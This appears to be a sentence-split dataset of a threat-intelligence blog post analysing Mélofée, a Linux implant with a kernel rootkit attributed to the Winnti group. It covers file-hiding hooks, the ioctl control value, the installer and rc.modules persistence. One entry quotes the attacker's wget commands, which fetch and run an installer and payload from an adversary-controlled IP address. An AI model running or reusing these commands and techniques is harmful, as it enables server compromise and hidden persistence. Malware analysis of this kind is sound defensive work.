Number,Content
Sentence 1,"Mélofée: a new alien malware in the Panda's toolset targeting Linux hosts
28.03.2023 00:00
We recently discovered an novel undetected implant family targeting Linux servers, which we dubbed Mélofée."
Sentence 2,"We linked with high confidence this malware to chinese state sponsored APT groups, in particular the notorious Winnti group."
Sentence 3,"In this blogpost we will first analyze the capabilities offered by this malware family, which include a kernel mode rootkit, and then deep dive in an infrastructure pivot maze to discover related adversary toolsets."
Sentence 4,"adversarypanda
Mélofée implant analysis
We found three samples of this malware family, which we dubbed Mélofée."
Sentence 5,"Two of these samples included a version number (20220111, 20220308), and we assess that the last sample was likely dated from late April or May 2022."
Sentence 6,"All these samples shared a common code base, but showed a constant development in the following domains:
evolutions of the communication protocol and the packet format
change in the encryption of the configuration, using first RC4 and then a simple xor
the development of a SelfForwardServer functionality
lastly, the inclusion of a kernel mode rootkit in the last sample."
Sentence 7,"Rootkit
The first sample we found dropped a rootkit based on a modified version of the open source projet Reptile 1."
Sentence 8,"According to the vermagic metadata, it is compiled for a kernel version 5.10.112-108.499.amzn2.x86_64."
Sentence 9,"The rootkit has a limited set of features, mainly installing a hook designed for hiding itself."
Sentence 10,"The rootkit hooks the functions fillonedir, filldir and filldir64 in order to not display files with names containing intel_audio or rc.modules when listing a directory."
Sentence 11,It also hooks the inet_ioctl function in order to be able to communicate with its userland part using the ioctl system call.
Sentence 12,"The kernel rootkit expects the userland component to send a value of 0xe0e0e0e during the IOCTL call, with 2 commands supported (these two commands being hide and show)."
Sentence 13,The rootkit is loaded both by the installer and server components with a call to the insmod utility.
Sentence 14,"Installer
The implant and the rootkit were installed using shell commands downloading both the installer and a custom binary package from an adversary controlled server."
Sentence 15,This behaviour is similar to the installation process of Winnti Linux rootkits.
Sentence 16,"wget http://173.209.62.186:8765/installer -O /var/tmp/installer
wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd;
chmod +x /var/tmp/installer;
/var/tmp/installer -i /var/tmp/usbd
The installer is also developped in C++, and takes the binary package as an argument."
Sentence 17,It then then proceeds to extract and install both the rootkit and the server component.
Sentence 18,"The rootkit and implant paths are hardcoded to respectively /etc/intel_audio/intel_audio.ko and /etc/intel_audio/audio The installer inserts the kernel rootkit using a call to system(insmod /etc/intel_audio/intel_audio.ko), and also install the persistance in the /etc/rc.modules file."
Sentence 19,Writing to this script ensures that both kernel and implant are executed at boot time2.
